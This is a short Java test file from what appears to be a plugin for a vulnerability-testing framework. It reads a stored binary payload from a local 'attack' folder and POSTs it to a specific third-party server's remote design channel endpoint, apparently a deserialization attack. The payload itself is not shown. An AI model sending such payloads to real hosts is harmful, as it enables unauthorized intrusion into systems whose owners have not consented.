package me.gv7.woodpecker.plugin;

import static org.junit.Assert.assertTrue;

import me.gv7.woodpecker.plugin.utils.FileUtil;
import me.gv7.woodpecker.plugin.utils.HttpTools;
import me.gv7.woodpecker.plugin.utils.Response;
import org.junit.Test;

import java.util.HashMap;

/**
 * Unit test for simple App.
 */
public class AppTest 
{
    /**
     * Rigorous Test :-)
     */
    public static void main(String[] args) {
//                System.getProperties().setProperty("http.proxyHost", "127.0.0.1");
//        System.getProperties().setProperty("http.proxyPort", "8080");
        String Header =
                "Accept-Encoding: */*\n" +
                        "User-Agent: PostmanRuntime/7.35.0\n" +
                        "Connection: close\n";
        HashMap<String, String> headerMap = new HashMap<>();
        String[] lines = Header.split("\n");

        for (String line : lines) {
            String[] parts = line.split(": ");
            if (parts.length == 2) {
                headerMap.put(parts[0], parts[1]);
            }
        }
        String url ="https://bzjx.htgd.com.cn:9443/webroot/decision/remote/design/channel";
        byte[] aa =  FileUtil.FileRead("/Users/jiangzelong/comsoft/tools/attack/vul/woodpecker/1.bin");
        Response res = HttpTools.post(url, aa,headerMap ,"UTF-8");
        System.out.println(res.getText());
    }
}
